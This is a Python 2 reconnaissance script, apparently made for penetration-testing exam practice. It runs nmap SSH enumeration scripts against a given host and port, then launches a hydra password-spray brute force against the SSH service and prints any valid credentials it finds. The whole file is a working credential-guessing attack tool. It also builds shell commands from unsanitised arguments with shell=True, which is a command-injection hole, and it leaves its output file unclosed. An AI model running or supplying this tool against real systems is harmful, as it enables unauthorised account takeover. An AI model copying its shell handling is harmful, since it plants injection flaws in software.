#!/usr/bin/env python
import subprocess
import sys

if len(sys.argv) != 3:
    print "Usage: sshrecon.py <ip address> <port>"
    sys.exit(0)

ip_address = sys.argv[1].strip()
port = sys.argv[2].strip()

print "INFO: Performing nmap SSH script scan for " + ip_address + ":" + port
SSHSCAN = "nmap -n -sV -Pn -vv -p %s --script=ssh-auth-methods,sshv1,ssh2-enum-algos -oN '/root/scripts/recon_enum/results/exam/ssh/%s_ssh.nmap' %s" % (port, ip_address, ip_address)
results = subprocess.check_output(SSHSCAN, shell=True)
outfile = "/root/scripts/recon_enum/results/exam/ssh/" + ip_address + "_sshrecon.txt"
f = open(outfile, "w")
f.write(results)
f.close

print "INFO: Performing hydra ssh scan against " + ip_address 
HYDRA = "hydra -L /usr/share/wordlists/lists/userlist.txt -P /usr/share/wordlists/lists/quick_password_spray.txt -f -o /root/scripts/recon_enum/results/exam/ssh/%s_sshhydra.txt -u %s -s %s ssh" % (ip_address, ip_address, port)
try:
    results = subprocess.check_output(HYDRA, shell=True)
    resultarr = results.split("\n")
    for result in resultarr:
        if "login:" in result:
	    print "[*] Valid ssh credentials found: " + result 
except:
    print "INFO: No valid ssh credentials found"
